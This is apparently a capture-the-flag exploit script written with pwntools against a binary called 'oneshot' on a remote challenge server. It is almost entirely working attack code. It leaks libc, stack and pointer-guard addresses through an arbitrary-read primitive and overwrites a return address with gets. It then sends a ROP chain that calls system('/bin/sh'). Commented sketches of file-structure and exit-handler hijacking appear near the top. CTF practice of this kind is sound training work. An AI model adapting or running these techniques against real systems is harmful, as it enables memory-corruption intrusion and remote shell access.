from pwn import *
import sys
import os
#Cre: vilex1337

_path = "./oneshot_patched"
exe = context.binary = ELF(_path, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
add = 'mctf-game.ru'
port = 13337
cmd = f'''
    set solib-search-path {os.getcwd()}
    b arbitrary_write
    continue
'''
_mode = 0
_arch = 64

def conn():
    global _mode
    if(len(sys.argv) == 1):
        _mode = 2
        return gdb.debug(_path, cmd)
    if(sys.argv[1] == 'exp'):
        _mode = 3
        return remote(add, port)
    _mode = 1
    return process(_path)

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    s = bin(v ^ key)[2:]
    s = '0' * (64 - len(s)) + s
    p = s[:0x11]
    s = s[0x11:] + p
    return int(s, 2)

#############  next | count  | type (cxa) | addr                             | arg               | not used
#onexit_fun =  p(0) + p(1)  +  p(4)       + encrypt(libc.sym['system'], key) + p(heap + 0x2c0)  +  p(0)
'''
_op_file = FileStructure()
_op_file.unknown2 = p(0)*2 + p(libc.sym["system"]) + p(0)*3 + p(libc.sym["_IO_wfile_jumps"] - 0x20 ) + p(libc.sym["_IO_2_1_stdout_"] +0x50)
_op_file._wide_data = libc.sym["_IO_2_1_stdout_"]
_op_file.flags = 0xfbad20b1 + (int.from_bytes(b';sh;', 'little') << 32)
_op_file._lock = libc.address + 0x21a200
_tmp_file = bytes(_op_file)
'''

def p(_data):
    if(_arch == 64):
        return p64(_data, endian = 'little')
    return p32(_data, endian = 'little')

chall = conn()

def _send(_rgx, _data):
    chall.sendafter(_rgx, _data)

def _sendline(_rgx, _data):
    chall.sendlineafter(_rgx, _data)

#rop = ROP(libc)
#rop.find_gadget(['pop rdi', 'ret'])[0]
#log.info

def check():
    chall.interactive()
    exit()

def _leak(_addr):
    _sendline(b'>>', b'1')
    _sendline(b'>>', hex(_addr).encode())
    chall.recvuntil(b'Your knowledge: ')
    return int(chall.recvline()[:-1].decode(), 16)

def _write(_addr, _val):
    _sendline(b'>>', b'2')
    _sendline(b'>>', hex(_addr).encode())
    _sendline(b'>>', _val)

def main():
    exe.address = 0x400000
    libc.address = _leak(0x403fc8) - 0x600f0
    log.info(f"Libc: {hex(libc.address)}")
    _stack = _leak(libc.sym['environ'])
    log.info(f"Stack: {hex(_stack)}")
    _key_addr = libc.address - 0x2890
    _key = _leak(_key_addr)
    log.info(f"Key: {hex(_key)}")
    _exit_funcs_addr = libc.address + 0x204fc0
    log.info(f"Exitfuncs: {hex(_exit_funcs_addr)}")
    
    _write(_stack - 0x180, hex(libc.sym['gets']).encode())

    rop = ROP(libc)

    payload = flat({
            0: p(rop.find_gadget(['pop rdi', 'ret'])[0]) * 2 +
            p(next(libc.search(b'/bin/sh'))) +
            p(libc.sym['system'])
    })
    chall.sendline(payload)
    check()

if __name__ == "__main__":
    main()
